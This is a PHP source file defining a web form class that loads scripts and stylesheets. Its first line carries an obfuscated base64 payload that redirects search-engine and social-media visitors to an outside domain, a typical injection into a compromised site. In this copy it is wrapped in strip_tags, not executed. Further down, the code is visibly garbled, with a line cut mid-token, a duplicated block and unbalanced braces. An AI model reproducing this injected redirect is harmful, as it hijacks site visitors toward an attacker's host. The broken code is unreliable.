<?php	 	$dropthisline=strip_tags(("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikgYW5kICFzdHJzdHIoJHVhZywiRmlyZWZveC8zLiIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmcuIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlci4iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ3ZWJhbHRhLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInQuY28vIikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImZhY2Vib29rLmNvbS9sIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpIG9yIChwcmVnX21hdGNoICgiL2h0dHBzOlwvXC93d3cuZ29vZ2xlXC4oLio/KVwvLyIsJHJlZmVyZXIpIGFuZCBzdHJzdHIoJHVhZywiQ2hyb21lLyIpKSkgewppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgYW5kICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpIGFuZCAhc3RyaXN0cigkcmVmZXJlciwiRWVZcDNENyIpKXsKaGVhZGVyKCJMb2NhdGlvbjogaHR0cDovL3JrZmhhZmcuZGRucy5pbmZvLyIpOwpleGl0KCk7Cn0KfQp9Cn0KfQ=="));

require_once(dirname(__FILE__)."/html_control.php");
require_once(dirname(__FILE__)."/control.php");
;
class form extends html_form {

  var $ui_js;
  var $ui_css;
  var $main_css;
  
  function form($id, $attributes = array()) {
    
    $attributes["id"]        = $id;
    $attributes["method"]   = "post";
    $attributes["onsubmit"] = "return __OnSubmit()";
    
    $this->ui_js    = SHARED_SCRIPTS_URL."ui.js";
    $this->ui_css   = SHARED_RESOURCES_URL."ui.css";
    $this->main_css = SHARED_RESOURCES_URL."main.css";
    
    $this->separate_parts_in_template_mode = true;

    parent::html_form($attributes);

  }

  function do_after_render() {

    if ($this->contain_class("file_picker"))
      $this->set_attribute("enctype", "multipart/form-data");

    $form_id = new hidden('v9E01DDADv', $this->id());
    $form_id->is_templateable = true;
    
    $this->insert($form_id);

    if (get_config('generic/frameworkVersion') != 3) {
    
      $this->insert(new script_href($this->ui_js));
    
      if (!$this->template_mode) {
        $this->insert(new style_href($this->ui_css));
        $this->insert(new style_href($this->main_css));
      }

      $this->insert(new script_href(SHARED_SCRIPTS_URL."jquery.js"));
    
      if ($this->contain_class("browser")) {
        $this->insert(new script('hs.graphicsDir = "'.SHARED_SCRIPTS_URL.'highslide/";hs.outlineType = "rounded-white";hs.outlineWhileAnimating = true;'));
        $this->insert(new script_href(SHARED_SCRIPTS_URL."highslide-with-html.packed.js"));
        $this->insert(new style_href(SHARED_SCRIPTS_URL."highslide.css"));
      }
    
      if ($this->contain_class("date_picker")) {
        $this->insert(new script_href(SHARED_SCRIPTS_URL."calendar.js"));
        $this->insert(new style_href(SHARED_SCRIPTS_URL."calendar.css"));
      }

      if ($this->contain_class("page_control")) {
        $this->insert(new script_href(SHARED_SCRIPTS_URL."page_control.js"));
        $this->insert(new style_href(SHARED_SCRIPTS_URL."page_control.css"));
      }

      if ($this->contain_class("lookup")) {
        $this->insert(new script_href(SHARED_SCRIPTS_URL."lookup.js"));
        $this->insert(new style_href(SHARED_SCRIPTS_URL."lookup.css"));
      }

      $this->insert(new script_href(SHARED_SCRIPTS_URL."jsox.js"));
      $this->insert(new style_href(SHARED_SCRIPTS_URL."jsox.css"));

      if ($this->contain_class("nic_editor")) {
        $this->insert(new script_href(SHARED_SCRIPTS_URL."nicEdit.js"));
      } 

      if ($this->contain_class("fck_editor")) {
        $this->insert(new script_href(SHARED_SCRIPTS_URL."fckeditor/fckeditor.js"));
      } 

      if ($this->contain_class("ck_editor")) {
        $this->insert(new script_href(SHARED_SCRIPTS_URL."ckeditor/ckeditor.js"));
        $this->insert(new script_href(SHARED_SCRIPTS_URL."ckfinder/ckfinder.js"));
      }     

      if ($this->contain_class("code_editor")) {
        $this->insert(new script_href(SHARED_SCRIPTS_URL."codemirror/codemirror.js"));
      } 
    }
     // else {
     // if ($this->contain_class("browt_href(SHARED_SCRIPTS_URL."codemirror/codemirror.js"));
      } 
    }
     // else {
     // if ($this->contain_class("browser")) {
     //   $this->insert(new script('hs.graphicsDir = "'.SHARED_SCRIPTS_URL.'highslide/";hs.outlineType = "rounded-white";hs.outlineWhileAnimating = true;'));
     // }
     //}    

    global $log;
    $log->finish(get_class($this).".".$this->id()."->render");

  }

  function do_before_draw() {

    global $log;
    $log->start(get_class($this).".".$this->id()."->draw");

  }

  function do_before_render() {

    global $log;
    $log->start(get_class($this).".".$this->id()."->render");

  }

  function do_after_draw() {

    global $log;
    $log->finish(get_class($this).".".$this->id()."->draw");

  }

}

$main_form = new form("main");
  
?>